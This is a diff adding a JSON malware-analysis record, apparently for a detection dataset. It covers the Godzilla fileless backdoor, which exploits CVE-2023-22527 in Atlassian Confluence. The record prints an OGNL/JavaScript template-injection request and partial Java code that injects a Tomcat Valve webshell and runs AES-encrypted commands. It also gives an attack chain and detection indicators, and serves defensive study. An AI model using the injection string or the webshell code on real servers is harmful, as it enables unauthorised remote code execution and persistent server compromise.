@@ -1,0 +1,135 @@
+{
+  "package_info": {
+    "package_name": "Godzilla Backdoor (MemGodValueShell, GodzillaValue)",
+    "package_manager": "N/A (exploits Atlassian Confluence via CVE-2023-22527, not a package manager ecosystem)",
+    "package_versions": "Confluence Data Center and Server (affected versions prior to January 2024 patch)",
+    "why_malicious": "The Godzilla backdoor is a fileless, in-memory malware that exploits a critical template injection vulnerability (CVE-2023-22527) in Atlassian Confluence. It enables unauthenticated remote code execution, persistent in-memory webshell access, and AES-encrypted C2 communication, all while evading traditional file-based detection."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "HTTP POST request to vulnerable template endpoint",
+        "file_location": "/template/aui/text-inline.vm (velocity template injection)",
+        "required_permissions": [
+          "network",
+          "JVM reflection",
+          "in-memory code execution"
+        ]
+      },
+      "code_snippet": "label=\u000b#request\u000b['#KEY_velocity.struts2.context'\u000b\r.internalGet('\u000bognl\u000b')].findValue(#parameters.x, {})+\u000b&x=(new javax.script.ScriptEngineManager().getEngineByName('js').eval(@org.apache.struts2.ServletActionContext@getRequest().getParameter('search')))&search=var ... data='yv66vgAAAD... (Base64 payload)'",
+      "code_language": "OGNL/JavaScript/Java (template injection)",
+      "code_behavior": "At HTTP request-time, the attacker injects OGNL/JavaScript code via a template parameter, which is evaluated by the vulnerable Confluence server, enabling arbitrary code execution and loading of a Base64-encoded Java class (webshell) into memory.",
+      "malice_analysis": {
+        "why_suspicious": "Template injection with arbitrary code execution is a hallmark of exploitation, especially when it loads encoded payloads.",
+        "violated_expectations": "Templates should only render data, not execute attacker-supplied code or load arbitrary classes.",
+        "similar_legitimate_use": "None; dynamic code execution via user input is never legitimate in this context.",
+        "key_indicators": [
+          "OGNL/JavaScript code injection in HTTP POST",
+          "Base64-encoded payload in request",
+          "Use of ScriptEngineManager for dynamic code execution"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "In-memory class loading after template injection",
+        "file_location": "JVM memory (no file written)",
+        "required_permissions": [
+          "JVM reflection",
+          "access to Tomcat internals"
+        ]
+      },
+      "code_snippet": "public class MemGodValueShell {\n  ...\n  public Object getField(Object object, String fieldName) {\n    for (Class<?> clazz = object.getClass(); clazz != Object.class; clazz = clazz.getSuperclass()) {\n      Field declaredField = clazz.getDeclaredField(fieldName);\n      declaredField.setAccessible(true);\n      return declaredField.get(object);\n    }\n    return null;\n  }\n  public MemGodValueShell() throws Exception {\n    Class<?> pipClass = Thread.currentThread().getContextClassLoader().loadClass(\"org.apache.catalina.Valve\");\n    Object standardContext = this.getStandardContext();\n    ...\n  }\n}",
+      "code_language": "Java",
+      "code_behavior": "At runtime, the injected class uses Java reflection to access private fields and Tomcat internals, then injects a custom Valve into the Tomcat pipeline, establishing a persistent in-memory webshell.",
+      "malice_analysis": {
+        "why_suspicious": "Reflection to access private fields and inject custom Valves is highly abnormal and enables deep server compromise.",
+        "violated_expectations": "Application code should not manipulate servlet container internals or inject runtime webshells.",
+        "similar_legitimate_use": "Reflection is used in frameworks, but not for arbitrary field access or webshell injection.",
+        "key_indicators": [
+          "Reflection to access private fields",
+          "Injection of custom Valve into Tomcat",
+          "No file system artifacts (fileless persistence)"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "Webshell command execution via HTTP requests",
+        "file_location": "In-memory webshell (Valve in Tomcat pipeline)",
+        "required_permissions": [
+          "network",
+          "command execution",
+          "AES cryptography"
+        ]
+      },
+      "code_snippet": "// GodzillaValue class (extends ValveBase)\nprivate String key = \"...\"; // AES key\npublic void invoke(Request request, Response response) {\n  String cmd = decrypt(request.getParameter(\"cmd\"), key);\n  String result = executeCommand(cmd);\n  response.getWriter().write(encrypt(result, key));\n}",
+      "code_language": "Java",
+      "code_behavior": "At runtime, the in-memory webshell receives AES-encrypted commands via HTTP, decrypts and executes them on the server, then encrypts and returns the output to the attacker.",
+      "malice_analysis": {
+        "why_suspicious": "AES-encrypted command-and-control over HTTP is a strong indicator of a backdoor.",
+        "violated_expectations": "Servlet Valves should not process arbitrary encrypted commands or execute system commands.",
+        "similar_legitimate_use": "Encryption for legitimate API traffic, but not for command execution.",
+        "key_indicators": [
+          "AES-encrypted C2 protocol",
+          "Command execution via HTTP",
+          "ValveBase extension for malicious logic"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker sends a malicious HTTP POST exploiting CVE-2023-22527 to inject OGNL/JavaScript code and a Base64-encoded payload.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "In-memory loading and execution of the Godzilla webshell class."
+    },
+    {
+      "step": 2,
+      "action": "Injected code decodes and loads the MemGodValueShell class into JVM memory using reflection.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Injection of a custom Valve into the Tomcat pipeline."
+    },
+    {
+      "step": 3,
+      "action": "Custom Valve (GodzillaValue) is activated, establishing a persistent in-memory webshell.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Server is now backdoored and awaits attacker commands."
+    },
+    {
+      "step": 4,
+      "action": "Attacker sends AES-encrypted commands via HTTP to the webshell, which decrypts, executes, and returns encrypted results.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Full remote control of the server and exfiltration of results."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Template injection leading to dynamic class loading",
+      "Reflection-based access to Tomcat internals",
+      "Injection of custom Valve objects at runtime",
+      "AES-encrypted command-and-control over HTTP"
+    ],
+    "file_indicators": [
+      "No persistent files (fileless); suspicious in-memory Valve objects",
+      "Unusual classes loaded in JVM memory (e.g., MemGodValueShell, GodzillaValue)"
+    ],
+    "network_indicators": [
+      "HTTP POST requests to /template/aui/text-inline.vm with OGNL/JavaScript payloads",
+      "AES-encrypted HTTP traffic to Confluence endpoints"
+    ],
+    "how_to_detect": "Monitor for template injection attempts and OGNL/JavaScript code in HTTP POST requests to Confluence endpoints. Detect in-memory anomalies such as unexpected Valve objects or classes loaded via reflection. Look for AES-encrypted command patterns in HTTP traffic. Use memory forensics to identify webshells that do not exist on disk. Correlate with known C2 patterns for Godzilla and similar backdoors."
+  }
+}
